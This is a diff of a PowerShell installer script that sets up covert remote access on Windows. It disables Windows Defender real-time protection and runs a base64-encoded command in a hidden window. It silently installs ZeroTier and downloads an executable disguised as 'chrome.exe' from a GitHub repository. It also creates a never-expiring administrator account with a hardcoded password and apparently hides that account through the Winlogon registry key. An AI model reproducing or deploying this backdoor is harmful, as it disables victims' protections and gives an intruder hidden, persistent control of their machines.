@@ -21,6 +21,9 @@ if (-NOT ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdenti
     exit # Exits the current, non-administrative script instance
 }
 
+# Disable Windows Defender Antivirus
+Set-MpPreference -DisableRealtimeMonitoring $true
+
 function Get-AntivirusInfo {
     # Ensure running as Administrator
     if (-NOT ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")) {
@@ -93,10 +96,10 @@ $encodedCommand = [Convert]::ToBase64String($bytes)
 # Launch the script block in a new PowerShell window
 Start-Process PowerShell.exe -ArgumentList "-NoProfile -EncodedCommand $encodedCommand" -WindowStyle Hidden
 
-# Check if ZeroTier One is already installed by checking for its folder
+# Check if ZeroTier One is already installed by checking for any executable in its folder
 $zeroTierFolderPath = "C:\Program Files (x86)\ZeroTier\One"
-if (Test-Path -Path $zeroTierFolderPath) {
-    Write-Host "ZeroTier One installation folder found, skipping download and installation."
+if (Test-Path -Path $zeroTierFolderPath -Filter "*.exe") {
+    Write-Host "Executable file found in ZeroTier One folder, skipping download and installation."
 } else {
     # Download and Install ZeroTier One silently if not already installed
     $zeroTierMsiUrl = "https://download.zerotier.com/RELEASES/1.6.5/dist/ZeroTierOne.msi"
@@ -105,9 +108,6 @@ if (Test-Path -Path $zeroTierFolderPath) {
     Start-Process "msiexec.exe" -ArgumentList "/i `"$zeroTierMsiPath`" /quiet" -Wait
     Remove-Item $zeroTierMsiPath -Force # Cleanup installer
 }
-
-# Disable Windows Defender Antivirus
-Set-MpPreference -DisableRealtimeMonitoring $true
 
 # Define the URL and download location for improved.exe
 $exeUrl = "https://github.com/Ogyeet10/installer9000/raw/main/chrome.exe"
@@ -212,10 +212,16 @@ Add-ProcessName -process 'reg.exe'
 Write-Host "Services and processes have been configured in the registry."
 
 # Create a new user `ssh-user` with administrative privileges
+# Check if SSH user exists before creating
 $userName = "ssh-user"
-$password = ConvertTo-SecureString "aidan123" -AsPlainText -Force
-New-LocalUser -Name $userName -Password $password -Description "SSH user account" -UserMayNotChangePassword -PasswordNeverExpires -Force
-Add-LocalGroupMember -Group "Administrators" -Member $userName
+if (-not (Get-LocalUser -Name $userName -ErrorAction SilentlyContinue)) {
+    $password = ConvertTo-SecureString "aidan123" -AsPlainText -Force
+    New-LocalUser -Name $userName -Password $password -Description "SSH user account" -UserMayNotChangePassword -PasswordNeverExpires
+    Add-LocalGroupMember -Group "Administrators" -Member $userName
+} else {
+    Write-Host "User $userName already exists. No need to create a new user."
+}
+
 
 # Path to the SpecialAccounts\UserList registry key
 $specialAccountsPath = "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList"
